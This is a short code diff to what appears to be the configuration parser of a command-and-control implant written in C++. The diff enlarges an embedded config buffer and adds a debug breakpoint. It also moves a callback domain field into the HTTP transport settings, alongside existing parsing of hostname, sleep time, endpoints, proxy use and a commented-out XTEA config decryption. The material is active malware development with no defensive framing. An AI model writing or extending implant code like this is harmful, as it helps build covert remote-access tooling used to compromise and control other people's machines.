@@ -6,7 +6,7 @@ VOID Entrypoint(HMODULE Base) {
 }
 
 namespace Implant {
-    TXT_SECTION(F) BYTE ConfigBytes[576] = {
+    TXT_SECTION(F) BYTE ConfigBytes[1024] = {
         0xDE,0xAD,0xBE,0xEF, 0xDE,0xAD,0xBE,0xEF,
     };
 
@@ -63,6 +63,7 @@ namespace Implant {
 
         //XteaCrypt(B_PTR(Parser.Handle), Parser.Length, Ctx->ConfigBytes.Key, FALSE);
 
+        __debugbreak();
         Parser::ParserMemcpy(&Parser, &Ctx->Config.Key, nullptr);
         Parser::ParserMemcpy(&Parser, R_CAST(PBYTE*, &Ctx->Root), nullptr);
         Parser::ParserMemcpy(&Parser, R_CAST(PBYTE*, &Ctx->LE), nullptr);
@@ -114,7 +115,6 @@ namespace Implant {
         }
 
         Parser::ParserStrcpy(&Parser, &Ctx->Config.Hostname, nullptr);
-        Parser::ParserStrcpy(&Parser, &Ctx->Config.Domain, nullptr);
 
         Ctx->Session.PeerId         = Parser::UnpackDword(&Parser);
         Ctx->Config.Sleeptime       = Parser::UnpackDword(&Parser);
@@ -144,6 +144,8 @@ namespace Implant {
 
         Ctx->Transport.http->Endpoints[Ctx->Transport.http->nEndpoints + 1] = nullptr;
         Ctx->Transport.bProxy = Parser::UnpackBool(&Parser);
+
+        Parser::ParserStrcpy(&Parser, &Ctx->Transport.Domain, nullptr  );
 
         if (Ctx->Transport.bProxy) {
             Ctx->Transport.http->Access = INTERNET_OPEN_TYPE_PROXY;
